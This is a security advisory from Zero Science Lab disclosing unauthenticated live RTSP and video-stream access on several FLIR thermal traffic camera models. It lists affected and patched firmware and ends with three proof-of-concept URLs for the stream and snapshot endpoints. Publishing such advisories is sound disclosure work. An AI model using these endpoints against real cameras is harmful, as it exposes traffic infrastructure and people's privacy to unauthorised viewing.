@@ -1,0 +1,100 @@
+
+FLIR Systems FLIR Thermal Traffic Cameras RTSP Stream Disclosure
+
+
+Vendor: FLIR Systems, Inc.
+Product web page: https://www.flir.com
+
+Affected firmware version: V1.01-0bb5b27 (TrafiOne)     Codename: TrafiOne
+                           E1.00.09      (TI BPL2 EDGE) Codename: TIIP4EDGE
+                           V1.02.P01     (TI x-stream)  Codename: TIIP2
+                           V1.05.P01     (ThermiCam)    Codename: ThermiCam
+                           V1.04.P02     (ThermiCam)    Codename: ThermiCam
+                           V1.04         (ThermiCam)    Codename: ThermiCam
+                           V1.01.P02     (ThermiCam)    Codename: ThermiCam
+                           V1.05.P03     (TrafiSense)   Codename: TrafiSense
+                           V1.06         (VIP-IP)       Codename: VIP-IP
+                           V1.02.P02     (TrafiRadar)   Codename: TrafiRadar
+
+Vendor patched firmware version:
+
+Product name                Firmware      Released 
+----------------------------------------------------
+ThermiCam / TrafiSense      E1.06.03      17.09.2018
+TI BPL2 EDGE                V1.00         17.09.2018
+TI x-stream                 E1.03.02      17.09.2018
+TrafiOne                    E1.02.02      17.09.2018
+----------------------------------------------------
+
+Summary: FLIR TrafiOne is an all-round detection sensor for traffic monitoring
+and dynamic traffic signal control. Offered in a compact and affordable
+package, the FLIR TrafiOne uses thermal imaging and Wi-Fi technology to
+adapt traffic signals based on the presence detection of vehicles, bicycles
+and pedestrians while at the same time generating high resolution data at
+intersections and in urban environments. FLIR TrafiOne helps traffic engineers
+to improve traffic flows, reduce vehicle idling time, monitor congestion,
+enhance safety for vulnerable road users, collect data and measure travel and
+delay times for different transport modes.
+
+FLIR TrafiCam is a vehicle presence sensor that combines a CMOS camera and a
+video detector in a single unit. FLIR TrafiCam detects moving and stationary
+vehicles at signalized intersections. Via detection outputs or via IP protocol,
+vehicle presence information is transmitted to the traffic controller so that
+signal timing can be adjusted dynamically. This way, vehicle waiting time at
+traffic lights is reduced and traffic flows are optimized.
+
+FLIR TrafiSense is an integrated thermal sensor and detector for vehicle and bike
+detection. TrafiSense does not need light to operate, but uses the thermal energy
+emitted from vehicles and bicyclists. This enables the sensor to detect vehicles
+and bikes in the darkest of nights, over a long range and in the most difficult
+weather conditions. The result is reliable, 24/7 traffic detection for a wide
+range of applications.
+
+FLIR TrafiRadar vehicle presence sensor is a combination of a video sensor and
+radar. TrafiRadar is typically used for stop bar and advance vehicle presence
+detection, traffic adaptive systems, and dilemma-zone protection and thus improves
+traffic safety and efficiency at signalized intersections. TrafiRadar will warn
+traffic light controllers whenever a vehicle is present in the dilemma zone, either
+extending green or red lights to improve overall safety.and stationary vehicles at
+signalized intersections and collect traffic data at intersections or interurban
+roads. Via detection outputs or via IP protocol, vehicle presence information is
+transmitted to the traffic controller so that signal timing can be adjusted
+dynamically. TrafiCam x-stream offers streaming video at full frame rate, to be
+used for traffic monitoring in a control room.
+
+The VIP series offers multi-functional Video Image Processing modules for traffic
+control. VIP boards integrate automatic incident detection, data collection,
+recording of pre and post incident image sequences and streaming video in one
+board. VIP modules have been installed for road and tunnel projects all over the
+world.
+
+Desc: FLIR thermal traffic cameras suffer from an unauthenticated and unauthorized
+live RTSP video stream access.
+
+Tested on: nginx/1.12.1
+           nginx/1.10.2
+           nginx/1.8.0
+           Websocket/13 (RFC 6455)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+Zero Science Lab - https://www.zeroscience.mk
+
+
+Advisory ID: ZSL-2018-5489
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5489.php
+
+Vendor firmware updates: https://www.flir.com/security/best-practices-for-cybersecurity/
+Vendor cyber hardening guide: https://www.flir.com/globalassets/security/flir-pro-security-cyber-hardening-guide.pdf
+
+
+01.08.2018
+
+--
+
+
+PoC:
+
+1. http://192.168.1.1/live.mjpeg?id=1
+2. rtsp://192.168.1.1/mpeg4
+3. http://192.168.1.1/snapshot.jpg
